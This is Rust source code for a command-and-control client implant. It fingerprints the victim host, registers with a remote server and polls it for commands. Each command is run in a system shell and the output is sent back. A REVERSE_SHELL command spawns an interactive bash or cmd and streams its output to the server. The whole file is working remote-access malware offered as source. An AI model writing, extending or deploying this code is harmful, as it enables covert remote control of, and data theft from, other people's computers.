use reqwest::Client;
use std::process::Stdio;
use std::time::Duration;
use tokio::io::{AsyncBufReadExt, BufReader};
use tokio::process::Command;
use tokio::time::sleep;
use uuid::Uuid;

use common::config::ClientConfig;
use common::error::{C2Error, C2Result};
use common::{
    message::{ClientInfo, CommandRequest, CommandResponse, Message, MessageType, ShellData},
    sysinfo::{get_country, get_hardware_info, get_hostname, get_local_ip},
};

/// C2 Client
pub struct C2Client {
    config: ClientConfig,
    http_client: Client,
    client_info: ClientInfo,
}

impl C2Client {
    pub async fn new(config: ClientConfig) -> C2Result<Self> { // Made async
        let client_id = config
            .client_id
            .clone()
            .unwrap_or_else(|| Uuid::new_v4().to_string());

        let hardware_info_str = get_hardware_info()
            .map_err(|e| C2Error::Other(format!("Failed to get hardware info: {e}")))?;
        let hardware_info: serde_json::Value = serde_json::from_str(&hardware_info_str)
            .map_err(|e| C2Error::Other(format!("Failed to parse hardware info: {e}")))?;

        let ip = get_local_ip()
            .unwrap_or_else(|_| "127.0.0.1".parse().unwrap())
            .to_string();

        // Move the blocking get_country call to a blocking task
        let country_info = tokio::task::spawn_blocking({
            let ip_clone = ip.clone(); // Clone ip for the closure
            move || get_country(ip_clone).ok()
        })
        .await
        .map_err(|e| C2Error::Other(format!("Failed to spawn blocking task for country info: {e}")))?;

        let client_info = ClientInfo {
            id: client_id,
            hostname: get_hostname().unwrap_or_else(|_| "unknown".to_string()),
            username: std::env::var("USER")
                .or_else(|_| std::env::var("USERNAME"))
                .unwrap_or_else(|_| "unknown".to_string()),
            os: std::env::consts::OS.to_string(),
            arch: std::env::consts::ARCH.to_string(),
            ip,
            country_info,
            cpu_brand: hardware_info
                .get("cpu_brand")
                .and_then(|v| v.as_str())
                .unwrap_or("unknown")
                .to_string(),
            cpu_frequency: hardware_info
                .get("cpu_frequency_MHz")
                .and_then(|v| v.as_u64())
                .unwrap_or(0),
            cpu_cores: hardware_info
                .get("cpu_cores")
                .and_then(|v| v.as_u64())
                .unwrap_or(0) as usize,
            memory: hardware_info
                .get("memory_GB")
                .and_then(|v| v.as_u64())
                .unwrap_or(0),
            total_disk_space: hardware_info
                .get("total_disk_space_GB")
                .and_then(|v| v.as_u64())
                .unwrap_or(0),
            available_disk_space: hardware_info
                .get("available_disk_space_GB")
                .and_then(|v| v.as_u64())
                .unwrap_or(0),
            connected_at: chrono::Utc::now(),
            last_seen: chrono::Utc::now(),
        };

        Ok(Self {
            config,
            http_client: Client::new(),
            client_info,
        })
    }

    /// Main loop for the client
    pub async fn run(&mut self) -> C2Result<()> {
        self.register().await?;
        println!("C2 Client started with ID: {}", self.client_info.id);

        loop {
            if let Err(e) = self.send_heartbeat().await {
                eprintln!("Failed to send heartbeat: {e}");
            }

            if let Err(e) = self.check_and_execute_commands().await {
                eprintln!("Failed to check commands: {e}");
            }

            sleep(Duration::from_secs(self.config.heartbeat_interval)).await;
        }
    }

    /// Register the client with the server
    async fn register(&mut self) -> C2Result<()> {
        self.client_info.last_seen = chrono::Utc::now();
        let payload = serde_json::to_vec(&self.client_info)?;
        let message = Message::new(MessageType::ClientRegister, payload);

        let res = self
            .http_client
            .post(format!("{}/api/register", self.config.server_url))
            .json(&message)
            .send()
            .await?;

        if res.status().is_success() {
            println!("Client registered successfully.");
        } else {
            return Err(C2Error::Network(format!(
                "Failed to register: {}",
                res.status()
            )));
        }
        Ok(())
    }

    /// Send a heartbeat to the server
    async fn send_heartbeat(&mut self) -> C2Result<()> {
        self.client_info.last_seen = chrono::Utc::now();
        let payload = self.client_info.id.as_bytes().to_vec();
        let message = Message::new(MessageType::Heartbeat, payload);

        self.http_client
            .post(format!("{}/api/heartbeat", self.config.server_url))
            .json(&message)
            .send()
            .await?;
        Ok(())
    }

    /// Check for and execute commands from the server
    async fn check_and_execute_commands(&self) -> C2Result<()> {
        let res = self
            .http_client
            .get(format!(
                "{}/api/commands/{}",
                self.config.server_url, self.client_info.id
            ))
            .send()
            .await?;

        if res.status().is_success() {
            let commands: Vec<CommandRequest> = res.json().await?;
            for cmd in commands {
                if let Err(e) = self.execute_command(cmd).await {
                    eprintln!("Error executing command: {e}");
                }
            }
        }
        Ok(())
    }

    /// Execute a single command
    async fn execute_command(&self, cmd: CommandRequest) -> C2Result<()> {
        println!("Executing command: {}", cmd.command);

        if cmd.command == "REVERSE_SHELL" {
            if let Some(session_id) = cmd.args.get(0) {
                return self.start_reverse_shell(session_id.clone()).await;
            } else {
                return Err(C2Error::Other(
                    "Reverse shell command missing session_id".into(),
                ));
            }
        }

        let output = if cfg!(target_os = "windows") {
            Command::new("cmd")
                .args(["/C", &cmd.command])
                .args(&cmd.args)
                .output()
                .await?
        } else {
            Command::new("sh")
                .arg("-c")
                .arg(format!("{} {}", cmd.command, cmd.args.join(" ")))
                .output()
                .await?
        };

        let result = CommandResponse {
            client_id: self.client_info.id.clone(),
            command: cmd.command.clone(),
            stdout: String::from_utf8_lossy(&output.stdout).to_string(),
            stderr: String::from_utf8_lossy(&output.stderr).to_string(),
            exit_code: output.status.code().unwrap_or(-1),
            executed_at: chrono::Utc::now(),
        };

        self.send_command_result(result).await
    }

    /// Send the result of a command back to the server
    async fn send_command_result(&self, result: CommandResponse) -> C2Result<()> {
        let payload = serde_json::to_vec(&result)?;
        let message = Message::new(MessageType::CommandResult, payload);

        self.http_client
            .post(format!("{}/api/command_result", self.config.server_url))
            .json(&message)
            .send()
            .await?;
        Ok(())
    }

    /// Start a reverse shell connection
    async fn start_reverse_shell(&self, session_id: String) -> C2Result<()> {
        println!("Starting reverse shell for session {session_id}...");
        let mut shell_process = if cfg!(target_os = "windows") {
            Command::new("cmd")
                .stdin(Stdio::piped())
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn()?
        } else {
            Command::new("/bin/bash")
                .arg("-i")
                .stdin(Stdio::piped())
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn()?
        };

        let stdout = shell_process
            .stdout
            .take()
            .ok_or(C2Error::Other("Failed to get stdout".into()))?;

        let http_client = self.http_client.clone();
        let server_url = self.config.server_url.clone();

        tokio::spawn(async move {
            let mut reader = BufReader::new(stdout);
            loop {
                let mut buf = Vec::new();
                match reader.read_until(b'\n', &mut buf).await {
                    Ok(0) => break, // EOF
                    Ok(_) => {
                        let shell_data = ShellData::new(session_id.clone(), buf);
                        let payload = serde_json::to_vec(&shell_data).unwrap();
                        let message = Message::new(MessageType::ShellData, payload);

                        if let Err(e) = http_client
                            .post(format!("{server_url}/api/shell_data"))
                            .json(&message)
                            .send()
                            .await
                        {
                            eprintln!("Failed to send shell data: {e}");
                        }
                    }
                    Err(e) => {
                        eprintln!("Error reading from shell stdout: {e}");
                        break;
                    }
                }
            }
        });

        Ok(())
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = std::env::args().collect();
    let server_url = args
        .get(1)
        .map(|s| s.to_string())
        .unwrap_or_else(|| "http://127.0.0.1:8080".to_string());

    let config = ClientConfig::default(); // Use default config
    let mut client = C2Client::new(ClientConfig {
        server_url,
        ..config
    }).await?; // Await the async new function
    client.run().await?;
    Ok(())
}
